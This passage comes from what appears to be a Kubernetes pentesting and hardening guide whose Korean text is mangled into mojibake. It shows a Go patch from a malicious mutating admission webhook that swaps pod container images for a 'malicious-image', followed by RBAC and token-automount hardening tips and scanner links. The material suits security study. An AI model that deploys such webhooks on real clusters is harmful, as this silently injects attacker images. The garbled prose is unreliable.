`./deploy.sh` ìŠ¤í¬ë¦½íŠ¸ëŠ” mutating webhook admission controllerë¥¼ ì„¤ì •í•˜ë©°, ì´ controllerëŠ” êµ¬ì„± ë¼ì¸ì— ì§€ì •ëœëŒ€ë¡œ Kubernetes APIë¡œì˜ ìš”ì²­ì„ ìˆ˜ì •í•˜ì—¬ ê´€ì°°ëœ ê²°ê³¼ì— ì˜í–¥ì„ ë¯¸ì¹©ë‹ˆë‹¤:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
## **ìµœì ì˜ ì‹¤ì²œ ë°©ë²•**

### **ì„œë¹„ìŠ¤ ê³„ì • í† í°ì˜ ìë™ ë§ˆìš´íŠ¸ ë¹„í™œì„±í™”**

* **Pods ë° ì„œë¹„ìŠ¤ ê³„ì •**: ê¸°ë³¸ì ìœ¼ë¡œ podsëŠ” ì„œë¹„ìŠ¤ ê³„ì • í† í°ì„ ë§ˆìš´íŠ¸í•©ë‹ˆë‹¤. KubernetesëŠ” ì´ ìë™ ë§ˆìš´íŠ¸ ê¸°ëŠ¥ì„ ë¹„í™œì„±í™”í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤.
* **ì ìš© ë°©ë²•**: Kubernetes ë²„ì „ 1.6ë¶€í„° ì„œë¹„ìŠ¤ ê³„ì • ë˜ëŠ” podsì˜ êµ¬ì„±ì—ì„œ `automountServiceAccountToken: false`ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤.

### **RoleBindings/ClusterRoleBindingsì—ì„œ ì œí•œì ì¸ ì‚¬ìš©ì í• ë‹¹**

* **ì„ íƒì  í¬í•¨**: RoleBindings ë˜ëŠ” ClusterRoleBindingsì— í•„ìš”í•œ ì‚¬ìš©ìë§Œ í¬í•¨ë˜ë„ë¡ í•©ë‹ˆë‹¤. ê·œì¹™ì ìœ¼ë¡œ ê²€í† í•˜ê³  ê´€ë ¨ ì—†ëŠ” ì‚¬ìš©ìë¥¼ ì œê±°í•˜ì—¬ ë³´ì•ˆì„ ìœ ì§€í•©ë‹ˆë‹¤.

### **ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë³„ Roles ëŒ€ í´ëŸ¬ìŠ¤í„° ì „ì²´ Roles**

* **Roles vs. ClusterRoles**: í´ëŸ¬ìŠ¤í„° ì „ì²´ì— ì ìš©ë˜ëŠ” ClusterRoles ë° ClusterRoleBindings ëŒ€ì‹  ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë³„ ê¶Œí•œì—ëŠ” Roles ë° RoleBindingsë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ ë” ì„¸ë°€í•œ ì œì–´ë¥¼ ì œê³µí•˜ê³  ê¶Œí•œì˜ ë²”ìœ„ë¥¼ ì œí•œí•©ë‹ˆë‹¤.

### **ìë™í™” ë„êµ¬ ì‚¬ìš©**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **ì°¸ê³  ìë£Œ**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)
